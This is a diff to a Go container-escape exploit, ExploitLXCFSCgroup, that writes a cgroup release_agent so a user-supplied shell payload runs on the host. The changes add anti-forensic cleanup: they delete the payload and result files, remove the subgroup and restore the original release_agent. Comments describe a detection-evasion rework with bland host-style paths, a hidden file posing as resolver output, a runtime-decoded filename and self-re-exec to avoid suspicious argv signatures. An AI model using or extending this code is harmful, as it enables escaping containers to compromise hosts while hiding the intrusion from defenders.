@@ -126,6 +126,9 @@ func ExploitLXCFSCgroup() bool {
 	// NOTE: generateShellExp signature changed in 执行降噪 patch;
 	//       it now returns (rand, shell, outFile) with bland host-style paths.
 	var taskRandString, expShellText, outFile = generateShellExp(hostPath, cmd)
+	resultFile := "/run/.resolv_out_" + taskRandString
+	defer func() { _ = os.Remove(outFile) }()
+	defer func() { _ = os.Remove(resultFile) }()
 	log.Printf("generate shell payload with user-input cmd: \n\n%s\n\n", cmd)
 	fmt.Printf("final shell payload is: \n\n")
 	fmt.Println(expShellText)
@@ -150,6 +153,7 @@ func ExploitLXCFSCgroup() bool {
 		log.Printf("cannot create subgroup :%s", err)
 		return false
 	}
+	defer func() { _ = os.RemoveAll(targetDir + subgroupName) }()
 
 	// enable notify_on_release
 	err = ioutil.WriteFile(targetDir+subgroupName+"/notify_on_release", []byte("1"), 0644)
@@ -158,15 +162,24 @@ func ExploitLXCFSCgroup() bool {
 		return false
 	}
 	// write release_agent (filename decoded at runtime; no plaintext literal)
-	err = ioutil.WriteFile(releaseAgentPath+util.CgroupReleaseAgentFile(), []byte(hostPath+outFile), 0644)
+	releaseAgentFile := releaseAgentPath + util.CgroupReleaseAgentFile()
+	previousReleaseAgent, restoreReleaseAgent := ioutil.ReadFile(releaseAgentFile)
+	err = ioutil.WriteFile(releaseAgentFile, []byte(hostPath+outFile), 0644)
 	if err != nil {
 		log.Printf("cgroup release control file is not writable %s", err)
 		return false
 	}
+	defer func() {
+		if restoreReleaseAgent == nil {
+			_ = ioutil.WriteFile(releaseAgentFile, previousReleaseAgent, 0644)
+		} else {
+			_ = ioutil.WriteFile(releaseAgentFile, []byte{}, 0644)
+		}
+	}()
 
 	// trigger release.
 	// Same 执行降噪 rework as mount_cgroup.go: self-reexec instead of
-	// `/bin/sh -c sleep 2` to avoid tell-tale argv signatures.
+	// a shell-based sleep trigger to avoid tell-tale argv signatures.
 	triggerProc, err := os.StartProcess(os.Args[0], []string{os.Args[0], util.TriggerArgv}, &os.ProcAttr{
 		Files: []*os.File{nil, nil, nil},
 		Env:   []string{"PATH=/tmp"},
@@ -195,7 +208,7 @@ func ExploitLXCFSCgroup() bool {
 		// upperdir (hostPath+outputFile), which surfaces back through the
 		// container's own /. Do NOT prefix hostPath — that host path is not
 		// visible from inside the container.
-		retRes, err = ioutil.ReadFile("/run/.resolv_out_" + taskRandString)
+		retRes, err = ioutil.ReadFile(resultFile)
 		if err == nil {
 			break
 		}
